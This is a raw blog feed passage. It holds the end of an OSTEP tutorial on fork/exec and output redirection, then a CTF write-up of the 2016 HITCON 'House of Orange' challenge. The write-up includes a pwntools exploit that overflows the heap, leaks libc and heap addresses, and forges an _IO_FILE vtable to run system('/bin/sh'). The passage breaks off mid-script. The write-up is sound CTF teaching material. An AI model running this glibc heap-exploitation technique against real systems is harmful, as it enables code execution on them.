class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world (pid:%d)\n&quot;</span>, (<span class="type">int</span>) getpid());</span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// fork failed; exit</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child (new process)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am child (pid:%d)\n&quot;</span>, (<span class="type">int</span>) getpid());</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent goes down this path (original process)</span></span><br><span class="line">        <span class="type">int</span> wc = wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am parent of %d (wc:%d) (pid:%d)\n&quot;</span>,</span><br><span class="line">           rc, wc, (<span class="type">int</span>) getpid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p2</span><br><span class="line">hello world (pid:5404)</span><br><span class="line">hello, I am child (pid:5405)</span><br><span class="line">hello, I am parent of 5405 (wc:5405) (pid:5404)</span><br></pre></td></tr></table></figure><p>两个进程运行先后顺序还是取决于cpu调度</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>man 3 exec</p><p>exec 函数族</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">execl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">const</span> <span class="type">char</span> *arg, ...</span></span><br><span class="line"><span class="params">          <span class="comment">/* (char  *) NULL */</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execlp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">const</span> <span class="type">char</span> *arg, ...</span></span><br><span class="line"><span class="params">           <span class="comment">/* (char  *) NULL */</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execle</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">const</span> <span class="type">char</span> *arg, ...</span></span><br><span class="line"><span class="params">           <span class="comment">/*, (char *) NULL, char *const envp[] */</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[])</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execvp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[])</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execvpe</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[],</span></span><br><span class="line"><span class="params">            <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br></pre></td></tr></table></figure><p>只有execve是真正意义上的系统调用，其它都是在此基础上经过包装的库函数，函数功能大同小异就是调用加载器根据要加载的ELF头表里的信息覆写调用程序<br>的代码段（以及静态数据），堆、栈及其他内存空间也会被重新初始化，并把参数传递，该函数调用成功不会返回</p><p>execve实际上也不会把磁盘里的程序拷贝到物理内存，而是把进程的页表映射到磁盘上，触发缺页后由处理程序再加载到物理内存供cpu 使用</p><p>被继承</p><ul><li>文件描述符</li><li>信号处理程序</li><li>用户和组 ID</li><li>环境变量</li><li>信号屏蔽字</li></ul><p>当前进程中的任何线程或锁不会被继承，在新程序中，不会有任何父进程中的局部变量、栈和堆等内存信息。</p><p><code>int execve(const char *pathname, char *const argv[], char *const envp[])</code></p><ul><li>filename：指向可执行文件名的用户空间指针。</li><li>argv：参数列表，指向用户空间的参数列表起始地址 </li><li>envp：环境变量表，环境变量是一系列键值对，字符串类型</li><li>argv envp数组以null结尾</li></ul><p><code>int main (int argc, char *argv [], char *envp [])</code></p><p><img src="/2023/04/11/OSTEP-5-Process-API/image-20230420112311806.png" alt="image-20230420112311806"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* myecho.c */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[],<span class="type">char</span> *envp[])</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; argc; j++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;argv[%d]: %s\n&quot;</span>, j, argv[j]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; envp[i]; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, envp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* execve.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">    <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *newargv[] = &#123; <span class="literal">NULL</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="type">char</span> *newenviron[] = &#123; <span class="string">&quot;grxer=666&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s &lt;file-to-exec&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    newargv[<span class="number">0</span>] = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    execve(argv[<span class="number">1</span>], newargv, newenviron);</span><br><span class="line">    perror(<span class="string">&quot;execve&quot;</span>);   <span class="comment">/* execve() returns only on error */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/test&gt; gcc  -g -o myecho myecho.c &amp;&amp; gcc -g -o execve execve.c</span><br><span class="line">grxer@grxer ~/D/s/test&gt; ./execve ./myecho</span><br><span class="line">argv[0]: ./myecho</span><br><span class="line">argv[1]: hello</span><br><span class="line">argv[2]: world</span><br><span class="line">grxer=666</span><br><span class="line">./myecho</span><br><span class="line">hello</span><br><span class="line">world</span><br></pre></td></tr></table></figure><h3 id="用奇怪的约定做一些神奇的事情"><a href="#用奇怪的约定做一些神奇的事情" class="headerlink" title="用奇怪的约定做一些神奇的事情"></a>用奇怪的约定做一些神奇的事情</h3><p>fork和exev看起来是非常奇怪的，为什么要把两个操作分开去创建新进程，而不是整合成一个api，其实这给了shell 在fork 之后 exec 之前运行代码的机会，来实现一些很cool的事</p><p>比如说我们的输出重定向</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// fork failed; exit</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// child: redirect standard output to a file</span></span><br><span class="line">    close(STDOUT_FILENO); </span><br><span class="line">    open(<span class="string">&quot;./p4.output&quot;</span>, O_CREAT|O_WRONLY|O_TRUNC, S_IRWXU);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// now exec &quot;wc&quot;...</span></span><br><span class="line">        <span class="type">char</span> *myargs[<span class="number">3</span>];</span><br><span class="line">        myargs[<span class="number">0</span>] = strdup(<span class="string">&quot;wc&quot;</span>);   <span class="comment">// program: &quot;wc&quot; (word count)</span></span><br><span class="line">        myargs[<span class="number">1</span>] = strdup(<span class="string">&quot;p4.c&quot;</span>); <span class="comment">// argument: file to count</span></span><br><span class="line">        myargs[<span class="number">2</span>] = <span class="literal">NULL</span>;           <span class="comment">// marks end of array</span></span><br><span class="line">        execvp(myargs[<span class="number">0</span>], myargs);  <span class="comment">// runs word count</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent goes down this path (original process)</span></span><br><span class="line">        <span class="type">int</span> wc = wait(<span class="literal">NULL</span>);</span><br><span class="line">    assert(wc &gt;= <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p4</span><br><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; cat ./p4.output </span><br><span class="line"> <span class="number">34</span> <span class="number">114</span> <span class="number">918</span> p4.c</span><br></pre></td></tr></table></figure><p>可以看到我们成功把输出重定向到文件</p><p>原理：</p><p>fork后子进程会继承父进程默认打开的标准输入、标准输出和标准错误输出0、1 和 2 ，默认情况下，这些文件描述符与终端设备关联，因此，当程序从标准输入读取数据时，数据会从终端输入；当程序向标准输出写入数据时，数据会输出到终端。</p><p>我们在exec前把标准输出文件描述符给关闭，然后再打开.&#x2F;p4.output时，UNIX 系统从 0 开始寻找可以使用的文件描述符，自然找到之前被关闭的标准输出文件描述符，给替换掉，实现重定向</p><p>strace看一下 -ff filename 将不同进程(子进程)产生的系统调用输出到filename.PID文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; strace -ff -o task ./p4</span><br><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ls ./task*</span><br><span class="line">./task.7615  ./task.7616</span><br><span class="line"></span><br><span class="line">close(1)                                = 0</span><br><span class="line">openat(AT_FDCWD, &quot;./p4.output&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0700) = 1</span><br><span class="line">newfstatat(1, &quot;&quot;, &#123;st_mode=S_IFREG|0777, st_size=17, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">write(1, &quot; 34 114 918 p4.c\n&quot;, 17)      = 17</span><br></pre></td></tr></table></figure><p>The openat() system call operates in exactly the same way as open(2)</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016 Hitcon House Of Orange</title>
      <link href="/2023/04/10/2016-hitcon-house-of-orange/"/>
      <url>/2023/04/10/2016-hitcon-house-of-orange/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1f6IBfouAMu1PFnck0vJ41Q">https://pan.baidu.com/s/1f6IBfouAMu1PFnck0vJ41Q</a><br>提取码：rg6j</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; checksec houseoforange_hitcon_2016 </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Share/ctfwiki/pwn/io_file/houseoforange_hitcon_2016&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>Upgrade里没有和原来的大小做比较存在堆溢出，只能申请最多四次，而且只能更新最近的一个orange，没有free项</p><h2 id="泄露libc和heap地址"><a href="#泄露libc和heap地址" class="headerlink" title="泄露libc和heap地址"></a>泄露libc和heap地址</h2><p><code>add(0x10,b&quot;a&quot;) payload=b&#39;a&#39;*0x10+p64(0)+p64(0x21)+p64(0x1f00000001)+p64(0)*2+p64(0xfa1) edit(len(payload),payload)</code></p><p>先申请小堆块，利用溢出修改topchunk大小，注意我们申请的三个堆是中间的堆，别忘了页对齐</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410091710000.png" alt="image-20230410091710000"></p><p><code>add(0x1000,b&#39;a&#39;)</code></p><p>申请的大chunk会把topchunk链入unsortedbin，因为前面会再申请一个0x10大小的chunk所以60变成了80,后面会再切割一个0x8chunk，80变为a0，后面就不会再提了</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410092959397.png" alt="image-20230410092959397"></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410092846998.png" alt="image-20230410092846998"></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410091908716.png" alt="image-20230410091908716"></p><p>我们这个时候去随便切割一块就可以拿到main_raena+88的地址，但是我们后面House of orange还会用到堆的地址</p><p>这个时候我们需要利用unsortedbin的机制，如果unsorted bin中只有一个chunk且这个chunk是last remainder chunk，申请堆块大小为largebin时，会先把这个chunk放到largedbin里再切割，这个时候会有fd_nextsize和bk_nextsize的链表，由于largebin里只有一个chunk，fd_nextsize和bk_nextsize会链向自己</p><p><code>add(0x400,b&#39;c&#39;)</code></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410132956019.png" alt="image-20230410132956019"></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410122608560.png" alt="image-20230410122608560"></p><p><code>show()</code>直接打印泄露libc基地址</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410122710779.png" alt="image-20230410122710779"></p><p><code>edit(0x10,b&#39;a&#39;*11+b&#39;grxer&#39;)</code>把前16个数据覆盖就可以打印出heap地址</p><h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">fake_file=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(_IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># fake_file+=b&#x27;grxer666&#x27;</span></span><br><span class="line">fake_file+=p64(heap+<span class="number">0x508</span>+<span class="number">8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(system)</span><br><span class="line">payload+=fake_file</span><br></pre></td></tr></table></figure><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410125530529.png" alt="image-20230410125530529"></p><p>注意一下绕过一下中间的块</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410132008871.png" alt="image-20230410132008871"></p><p>常规绕过伪造 IO_FILE_plus 这次我们直接把mode改为0(判断条件时&lt;&#x3D;就行)，可以直接ljust到0xd8，到vtable</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_file+=p64(heap+<span class="number">0x508</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)*<span class="number">0</span>+p64(system)</span><br></pre></td></tr></table></figure><p>这样伪造也可以把_vtable当成我们第一个jump函数，payload更短</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_FILE_plus*)0x5555557584f0</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x60 &lt;error: Cannot access memory at address 0x60&gt;, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd2510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x5555557585d0</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_jump_t*)0x5555557585d0</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x0, </span><br><span class="line">  __overflow = 0x7ffff7a523a0 &lt;__libc_system&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪造完成，再申请一个堆块就可以触发__overflow调用链</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410132625782.png" alt="image-20230410132625782"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./houseoforange_hitcon_2016&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&quot;26057&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,price=<span class="number">1</span>,color=<span class="number">1</span></span>):</span><br><span class="line">    ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Name :&quot;</span>)</span><br><span class="line">    s(name)</span><br><span class="line">    ru(<span class="string">b&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,name,price=<span class="number">1</span>,color=<span class="number">0xddaa</span></span>):</span><br><span class="line">    ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    s(name)</span><br><span class="line">    ru(<span class="string">b&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(color).encode())</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x1f00000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27; house : &#x27;</span>)</span><br><span class="line">libcbase=uu64(r(<span class="number">6</span>))-<span class="number">0x3c5163</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">unsorted_bin=libcbase+<span class="number">0x68</span>+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">_IO_list_all=libcbase+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;unsotr&#x27;</span>,unsorted_bin)</span><br><span class="line">p(<span class="string">&#x27;iolist&#x27;</span>,_IO_list_all)</span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span>+<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">heap=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">fake_file=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(_IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># 